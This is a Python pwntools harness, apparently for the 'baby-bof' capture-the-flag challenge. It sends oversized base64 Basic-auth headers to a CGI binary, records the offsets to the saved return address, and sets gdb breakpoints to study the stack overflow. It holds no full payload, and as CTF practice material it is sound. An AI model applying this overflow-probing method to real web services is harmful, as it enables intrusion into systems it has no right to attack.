#!/usr/bin/env python3

"""
Local harness for the baby-bof CGI challenge.

Examples:
    python3 solve.py
    python3 solve.py MODE=none
    python3 solve.py TEXT='admin:test'
    python3 solve.py MODE=cyclic LEN=420 THROW=1
    python3 solve.py GDB MODE=cyclic LEN=420 THROW=1
    python3 solve.py REMOTE HOST=127.0.0.1 PORT=32367 MODE=none

Notes:
    - Local mode executes index.cgi directly with CGI environment variables.
    - REMOTE mode sends a real HTTP request to the lighttpd service.
    - THROW=1 appends '@AAA' after valid base64 so decode_base64() throws only
      after decoding the whole payload. The raw payload is padded to a multiple
      of 3 first so '=' padding does not make the decoder fail too early.
"""

from __future__ import annotations

import base64
import os
import pathlib
import shutil
import socket
import subprocess
import sys

from pwn import ELF, args, context, cyclic, gdb, log


ROOT = pathlib.Path(__file__).resolve().parent
EXE_PATH = pathlib.Path(args.EXE or (ROOT / "index.cgi")).resolve()
FLAG_PATHS = [pathlib.Path("/flag.txt"), ROOT / "flag.txt"]

OFFSET_TO_SAVED_RBP = 0x110
OFFSET_TO_SAVED_RIP = 0x118

MAIN_SYM = "main"
VALIDATE_AUTH_SYM = "_ZN12_GLOBAL__N_1L13validate_authEPcPKc"
DECODE_BASE64_SYM = "_ZN12_GLOBAL__N_1L13decode_base64EPKcPc"

EXE: ELF | None = None


def configure_context() -> ELF:
    global EXE

    exe = ELF(str(EXE_PATH), checksec=False)
    EXE = exe
    context.binary = exe
    context.log_level = args.LOG_LEVEL or ("debug" if args.DEBUG else "info")

    if shutil.which("tmux") and os.environ.get("TMUX"):
        context.terminal = ["tmux", "splitw", "-h"]
    elif shutil.which("foot"):
        context.terminal = ["foot", "-e", "sh", "-c"]
    elif shutil.which("x-terminal-emulator"):
        context.terminal = ["x-terminal-emulator", "-e"]

    return exe


def bool_arg(name: str) -> bool:
    value = getattr(args, name, False)
    if value is False or value is None:
        return False
    if value is True:
        return True
    return str(value).lower() not in {"0", "false", "no", "off", ""}


def int_arg(name: str, default: int) -> int:
    value = getattr(args, name, None)
    return default if not value else int(value, 0)


def float_arg(name: str, default: float) -> float:
    value = getattr(args, name, None)
    return default if not value else float(value)


def read_flag_guess() -> str:
    for path in FLAG_PATHS:
        try:
            return path.read_text().splitlines()[0]
        except OSError:
            continue
    return "grey{fake_flag}"


def encode_basic(decoded: bytes, throw_after: bool) -> bytes:
    raw = bytearray(decoded)
    if throw_after:
        while len(raw) % 3:
            raw += b"P"
        return b"Basic " + base64.b64encode(bytes(raw)) + b"@AAA"
    return b"Basic " + base64.b64encode(bytes(raw))


def build_auth_header() -> bytes | None:
    if args.AUTH:
        raw = args.AUTH.encode()
        return raw if raw.startswith(b"Basic ") else b"Basic " + raw

    throw_after = bool_arg("THROW")

    if args.HEX:
        return encode_basic(bytes.fromhex(args.HEX), throw_after)

    if args.TEXT:
        return encode_basic(args.TEXT.encode(), throw_after)

    mode = (args.MODE or "valid").lower()
    if mode == "none":
        return None
    if mode == "invalid":
        return b"Basic !!!!"
    if mode == "cyclic":
        return encode_basic(cyclic(int_arg("LEN", 0x200), n=8), throw_after)
    if mode != "valid":
        raise SystemExit(f"Unsupported MODE={mode!r}")

    user = args.USER or "admin"
    password = args.PASS or read_flag_guess()
    return encode_basic(f"{user}:{password}".encode(), throw_after)


def build_cgi_env(auth_header: bytes | None, port: int) -> dict[str, str]:
    env = os.environ.copy()
    env.update(
        {
            "GATEWAY_INTERFACE": "CGI/1.1",
            "REQUEST_METHOD": "GET",
            "SERVER_PROTOCOL": "HTTP/1.1",
            "SERVER_SOFTWARE": "baby-bof-debug",
            "SERVER_NAME": "localhost",
            "SERVER_PORT": str(port),
            "REMOTE_ADDR": "127.0.0.1",
            "REMOTE_PORT": "31337",
            "DOCUMENT_ROOT": str(EXE_PATH.parent),
            "SCRIPT_NAME": "/index.cgi",
            "SCRIPT_FILENAME": str(EXE_PATH),
            "REQUEST_URI": "/",
            "QUERY_STRING": "",
        }
    )
    if auth_header is None:
        env.pop("HTTP_AUTHORIZATION", None)
    else:
        env["HTTP_AUTHORIZATION"] = auth_header.decode("latin-1")
    return env


def build_http_request(host: str, auth_header: bytes | None) -> bytes:
    lines = [
        f"GET / HTTP/1.1",
        f"Host: {host}",
        "User-Agent: baby-bof-debug",
    ]
    if auth_header is not None:
        lines.append(f"Authorization: {auth_header.decode('latin-1')}")
    lines.append("Connection: close")
    return ("\r\n".join(lines) + "\r\n\r\n").encode()


def build_gdbscript() -> str:
    if EXE is None:
        raise SystemExit("ELF context is not initialized")

    validate_auth = EXE.symbols[VALIDATE_AUTH_SYM]
    lines = [
        "set pagination off",
        "set breakpoint pending on",
        "set disassemble-next-line on",
        "handle SIGALRM nostop noprint pass",
        f"b *{EXE.symbols[MAIN_SYM]:#x}",
        f"b *{validate_auth:#x}",
        f"b *{validate_auth + 0x91:#x}",
        f"b *{EXE.symbols[DECODE_BASE64_SYM]:#x}",
        "catch throw",
    ]
    if args.GDBSCRIPT:
        lines.append(args.GDBSCRIPT)
    lines.append("c")
    return "\n".join(lines)


def run_local(auth_header: bytes | None, timeout: float) -> bytes:
    env = build_cgi_env(auth_header, port=int_arg("PORT", 8080))

    if args.GDB:
        if not getattr(context, "terminal", None):
            raise SystemExit("No terminal launcher found for GDB. Run inside tmux or set context.terminal.")
        io = gdb.debug([str(EXE_PATH)], env=env, gdbscript=build_gdbscript())
        return io.recvall(timeout=timeout)

    proc = subprocess.run(
        [str(EXE_PATH)],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
    )
    out = proc.stdout
    if proc.stderr:
        out += b"\n[stderr]\n" + proc.stderr
    if proc.returncode != 0 or bool_arg("INFO"):
        out += f"\n[exit]\n{proc.returncode}\n".encode()
    return out


def run_remote(auth_header: bytes | None, timeout: float) -> bytes:
    host = args.HOST or "127.0.0.1"
    port = int_arg("PORT", 32367)
    request = build_http_request(host, auth_header)

    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(request)
        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks)


def main() -> int:
    if not EXE_PATH.exists():
        raise SystemExit(f"Missing binary: {EXE_PATH}")

    configure_context()

    auth_header = build_auth_header()
    timeout = float_arg("TIMEOUT", 3.0)

    if bool_arg("DUMP_AUTH"):
        if auth_header is None:
            print("<no Authorization header>")
        else:
            print(auth_header.decode("latin-1"))
        return 0

    if bool_arg("INFO"):
        log.info(f"binary: {EXE_PATH}")
        log.info(f"saved rbp offset from decoded: {OFFSET_TO_SAVED_RBP:#x}")
        log.info(f"saved rip offset from decoded: {OFFSET_TO_SAVED_RIP:#x}")
        if auth_header is None:
            log.info("authorization: <none>")
        else:
            log.info(f"authorization length: {len(auth_header)}")

    data = run_remote(auth_header, timeout) if args.REMOTE else run_local(auth_header, timeout)
    sys.stdout.buffer.write(data)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
